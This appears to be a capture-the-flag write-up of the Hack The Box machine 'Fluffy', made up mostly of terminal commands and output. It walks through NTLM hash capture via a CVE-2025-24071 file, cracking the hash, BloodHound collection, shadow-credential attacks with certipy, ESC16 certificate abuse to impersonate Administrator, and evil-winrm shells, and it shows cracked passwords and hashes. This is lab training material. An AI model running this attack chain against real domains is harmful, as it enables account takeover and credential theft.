#### Overview



---
// First enumeration

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ sudo nmap 10.129.232.88 -Pn -sV  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-25 15:03 +0200  
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan  
Service scan Timing: About 63.64% done; ETC: 15:04 (0:00:05 remaining)  
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan  
Service scan Timing: About 90.91% done; ETC: 15:04 (0:00:05 remaining)  
Nmap scan report for 10.129.232.88  
Host is up (0.13s latency).  
Not shown: 989 filtered tcp ports (no-response)  
PORT     STATE SERVICE       VERSION  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-25 20:03:44Z)  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default  
-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default  
-First-Site-Name)  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default  
-First-Site-Name)  
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default  
-First-Site-Name)  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ sudo nmap 10.129.232.88 -Pn -p- -T5  
[sudo] password for yus3r:    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-25 15:04 +0200  
Nmap scan report for 10.129.232.88  
Host is up (0.12s latency).  
Not shown: 65516 filtered tcp ports (no-response)  
PORT      STATE SERVICE  
53/tcp    open  domain  
88/tcp    open  kerberos-sec  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5985/tcp  open  wsman  
9389/tcp  open  adws  
49668/tcp open  unknown  
49691/tcp open  unknown  
49692/tcp open  unknown  
49700/tcp open  unknown  
49716/tcp open  unknown  
49729/tcp open  unknown  
49763/tcp open  unknown  
  
Nmap done: 1 IP address (1 host up) scanned in 245.36 seconds
```

// Found readable and writeable share in SMB

```
...SNIP...

[+] IP: 10.129.232.88:445       Name: 10.129.232.88             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL  
        
...SNIP...
```

Got an interesting file in IT share

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]
└─$ smbclient -U fluffy.htb/j.fleischman%J0elTHEM4n1990! //10.129.232.88/IT
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Sep 26 15:20:31 2026
  ..                                  D        0  Sat Sep 26 15:20:31 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

                5842943 blocks of size 4096. 1752899 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (190.3 KiloBytes/sec) (average 190.3 KiloBytes/sec)
```

![[Pasted image 20260926082624.png]]

// Describe CVE-2025-24071

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ python3 PoC.py test 10.10.14.102  
  
  
[+] File test.library-ms created successfully.
```

```
smb: \> put exploit.zip  
putting file exploit.zip as \exploit.zip (0.8 kB/s) (average 0.8 kB/s)
```

Got Net-NTLM hash

```
...SNIP...

[+] Listening for events...  
  
[SMB] NTLMv2-SSP Client   : 10.129.93.226  
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila  
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:6fab96df52daa0d1:6C8170E597369E819D77654BC5C8FFF7:010100000  
000000000962E4F924DDD0186BB232C5233C868000000000200080049004A005700450001001E00570049004E002D0031004800  
440054005000300059004C004C004C00570004003400570049004E002D0031004800440054005000300059004C004C004C00570  
02E0049004A00570045002E004C004F00430041004C000300140049004A00570045002E004C004F00430041004C000500140049  
004A00570045002E004C004F00430041004C000700080000962E4F924DDD0106000400020000000800300030000000000000000  
100000000200000F84F53B99C716524A93C73ED6C44D4F866F41083401561B37F10A7BE0744464E0A0010000000000000000000  
00000000000000000900220063006900660073002F00310030002E00310030002E00310034002E0031003000320000000000000  
00000

...SNIP...
```

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ echo "p.agila::FLUFFY:6fab96df52daa0d1:6C8170E597369E819D77654BC5C8FFF7:010100000000000000962E4F924  
DDD0186BB232C5233C868000000000200080049004A005700450001001E00570049004E002D0031004800440054005000300059  
004C004C004C00570004003400570049004E002D0031004800440054005000300059004C004C004C0057002E0049004A0057004  
5002E004C004F00430041004C000300140049004A00570045002E004C004F00430041004C000500140049004A00570045002E00  
4C004F00430041004C000700080000962E4F924DDD0106000400020000000800300030000000000000000100000000200000F84  
F53B99C716524A93C73ED6C44D4F866F41083401561B37F10A7BE0744464E0A0010000000000000000000000000000000000009  
00220063006900660073002F00310030002E00310030002E00310034002E003100300032000000000000000000" > hash.hashes
```

Got p.agila domain password

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ john hash.hashes --wordlist=/home/yus3r/Tools/SecLists/Passwords/rockyou.txt    
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
Will run 7 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
prometheusx-303  (p.agila)        
1g 0:00:00:01 DONE (2026-09-26 08:52) 0.7812g/s 3530Kp/s 3530Kc/s 3530KC/s proquis..proball00  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed.
```

// Collecting data with BloodHound Data Collector

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ sudo python3 ~/Tools/BloodHound.py/bloodhound.py -d fluffy.htb -c all -u p.agila -p prom  
etheusx-303 -ns 10.129.94.190 -k  
[sudo] password for yus3r:    
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: fluffy.htb  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: dc01.fluffy.htb  
INFO: Testing resolved hostname connectivity dead:beef::a871:2436:c664:d882  
INFO: Trying LDAP connection to dead:beef::a871:2436:c664:d882  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc01.fluffy.htb  
INFO: Testing resolved hostname connectivity dead:beef::a871:2436:c664:d882  
INFO: Trying LDAP connection to dead:beef::a871:2436:c664:d882  
INFO: Found 10 users  
INFO: Found 54 groups  
INFO: Found 3 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: DC01.fluffy.htb  
INFO: Done in 00M 27S
```

// Describe the blue path

![[Pasted image 20260927102802.png]]

// Adding p.agila to the Service Accounts group

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx  
-303" -S "10.129.94.190"
```

```
  
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S  
"10.129.94.190"  
FLUFFY\ca_svc  
FLUFFY\ldap_svc  
FLUFFY\p.agila  
FLUFFY\winrm_svc
```

// Putting shadow credentials on winrm_svc account, requesting TGT and getting NTLM hash

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]
└─$ certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.94.190 -dc-host dc01.fluffy.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '44b9b20536c4474ca38c5bacef593c08'
[*] Adding Key Credential with device ID '44b9b20536c4474ca38c5bacef593c08' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '44b9b20536c4474ca38c5bacef593c08' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

Access to DC01 as winrm_svc via Win-RM and got the user flag

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]
└─$ evil-winrm -i 10.129.94.190 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd C:\Users\winrm_svc\Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/27/2026   6:24 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
42caf27510e116ef2d38e9bae4651d0f
```

// No interesting privileges

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

![[Pasted image 20260927222539.png]]

// Putting shadow credentials on ca_svc account, requesting TGT and getting NTLM hash

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ certipy-ad shadow auto -u winrm_svc@fluffy.htb -hashes '33bd09dcd697600edf6b3a7af4875767' -account ca_svc -dc-ip 10.129.95.142 -dc-host dc01.fluffy.htb  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Targeting user 'ca_svc'  
[*] Generating certificate  
[*] Certificate generated  
[*] Generating Key Credential  
[*] Key Credential generated with DeviceID 'e6e4e90070ad4d01b60fbdd28ce2e40a'  
[*] Adding Key Credential with device ID 'e6e4e90070ad4d01b60fbdd28ce2e40a' to the Key Credentials for 'ca_svc'  
[*] Successfully added Key Credential with device ID 'e6e4e90070ad4d01b60fbdd28ce2e40a' to the Key Credentials for 'ca_svc'  
[*] Authenticating as 'ca_svc' with the certificate  
[*] Certificate identities:  
[*]     No identities found in this certificate  
[*] Using principal: 'ca_svc@fluffy.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'ca_svc.ccache'  
[*] Wrote credential cache to 'ca_svc.ccache'  
[*] Trying to retrieve NT hash for 'ca_svc'  
[*] Restoring the old Key Credentials for 'ca_svc'  
[*] Successfully restored the old Key Credentials for 'ca_svc'  
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

Enumerate the AD CS service

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ certipy-ad find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.95.142 -dc-host dc01.fluffy.htb  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 33 certificate templates  

...SNIP...
 
[*] Saving text output to '20260928172724_Certipy.txt'  
[*] Wrote text output to '20260928172724_Certipy.txt'  
[*] Saving JSON output to '20260928172724_Certipy.json'  
[*] Wrote JSON output to '20260928172724_Certipy.json'
```

// Found ESC16 vuln

```
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
...SNIP...
	
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.

...SNIP...
```

// Brief description of ESC16

Changed ca_svc UPN to Administrator 

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -user ca_svc -upn 'administrator' -dc-ip 10.129.95.176 -dc-host DC01.  
fluffy.htb  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Updating user 'ca_svc':  
   userPrincipalName                   : administrator  
[*] Successfully updated 'ca_svc'
```

Requested a certificate as Administrator

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.95.176' -ca 'fluffy-DC01-CA' -template 'User' -debug  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[+] Nameserver: '10.129.95.176'  
[+] DC IP: '10.129.95.176'  
[+] DC Host: None  
[+] Target IP: '10.129.95.176'  
[+] Remote Name: '10.129.95.176'  
[+] Domain: ''  
[+] Username: 'CA_SVC'  
[+] Generating RSA key  
[*] Requesting certificate via RPC  
[+] Trying to connect to endpoint: ncacn_np:10.129.95.176[\pipe\cert]  
[+] Connected to endpoint: ncacn_np:10.129.95.176[\pipe\cert]  
[*] Request ID is 22  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator'  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[+] Attempting to write data to 'administrator.pfx'  
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y  
[+] Data written to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'
```

Restored original ca_svc UPN

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -user ca_svc -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.95.176 -dc-host D  
C01.fluffy.htb  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Updating user 'ca_svc':  
   userPrincipalName                   : ca_svc@fluffy.htb  
[*] Successfully updated 'ca_svc'
```

Auth as the Administrator account using the certificate

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.95.176  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: 'administrator'  
[*] Using principal: 'administrator@fluffy.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'administrator.ccache'  
[*] Wrote credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Access to DC01 as Administrator via Win-RM and got the root flag

```
┌──(yus3r㉿kali)-[~/HTB machines/Fluffy]  
└─$ evil-winrm -i 10.129.95.176 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir  
  
  
   Directory: C:\Users\Administrator\Desktop  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
-ar---        9/28/2026  10:26 AM             34 root.txt  
  
  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt  
e7a702455f39f8149c86b662adc95b63
```